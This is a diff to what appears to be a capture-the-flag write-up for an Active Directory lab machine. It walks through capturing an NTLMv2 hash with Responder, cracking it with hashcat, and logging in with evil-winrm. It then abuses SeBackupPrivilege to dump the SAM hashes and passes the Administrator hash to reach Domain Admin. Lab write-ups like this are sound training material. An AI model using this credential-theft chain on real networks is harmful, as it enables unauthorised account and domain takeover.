@@ -215,12 +215,109 @@ Also don't forgot to start
 sudo responder -I tun0
 ----
 
+=== Responder and cracking
+
 Here we go we got a `h.grangon` user hash
+
+[source]
+----
+h.grangon::BUILDINGMAGIC:a295406eb06ced15:363C72585E22F1AB73DF532B1B086DD4:010100000000000000E5A97DB555DC01F6F7C4219C36D7EC0000000002000800300046003500510001001E00570049004E002D0052004E003300570052004C004B00540054004E004D0004003400570049004E002D0052004E003300570052004C004B00540054004E004D002E0030004600350051002E004C004F00430041004C000300140030004600350051002E004C004F00430041004C000500140030004600350051002E004C004F00430041004C000700080000E5A97DB555DC010600040002000000080030003000000000000000000000000040000041705E2AFC127B309B3C1BF376F40EA2F68FE965675F16F9293B07C4EEEAE32A0A001000000000000000000000000000000000000900240063006900660073002F00310030002E003200300030002E00310039002E003100360035000000000000000000
+----
+
+Crack this hash by `hashcat`
+
+[source]
+----
+hashcat grangon.NTLM /home/kali/wordlists/passwords/rockyou.txt 
+----
+
+Check with `nxc`  :  `validation confirmed`
+
+Owned a new user `h.grangon` : `magic4ever`
+
 
 
 [[privesc]]
 == Privilege Escalation
+=== Remote Management Users
+During enumeration user `h.grangon` in bloodhound see that user exists in *Remote Management Users*
+
+So we can try connect to machine by tool `evil-winrm`
+
+[source]
+----
+evil-winrm -i 10.1.80.37 -u h.grangon -p magic4ever
+----
+
+User flag: `\Desktop\user.txt`
+
+=== Misconfigured privileges
+
+During post-enumeration so dangerous privileges by command
+
+[source]
+----
+whoami /priv
+----
+
+Vulnerable to Privilage Escalation 
+
+`SeBackupPrivilege  Back up files and directories  Enabled`
+
+So we can copy `sam` and `system` and dump hashes of common users
+
+=== SAM and SYSTEM
+
+[source]
+----
+C:> download sam
+#
+C:> download system
+----
+
+Download `sam` and `system` and dump `secrets` by tool `impacket-secretsdump`
+
+[source]
+----
+impacket-secretsdump -sam sam -system system local 
+----
+
+Obtain hashes of default users
+
+[source]
+----
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:520126a03f5d5a8d836f1c4f34ede7ce:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+----
+
+After several tries to login as `Administrator` by him hash it returns failture so maybe exist anouther user in system
+
+[source]
+----
+net users
+----
+
+Enumerated user `a.flatch`
+
+Also it can be possible that user `a.flatch` uses the same password which have Administrator
+
+[source]
+----
+evil-winrm -i dc01.buildingmagic.local -u 'a.flatch' -H '520126a03f5d5a8d836f1c4f34ede7ce'
+----
+
+User 'a.flatch' exists in group Domain Admins so system is obtained 
+
+Root flag: `\Administrator\Desktop\root.txt`
+
+Congratulations 
+
+
 
 
 [[notes]]
 == Final Notes
+Sourse with good info about Active Directory
+
+https://orange-cyberdefense.github.io/ocd-mindmaps/img/mindmap_ad_dark_classic_2025.03.excalidraw.svg
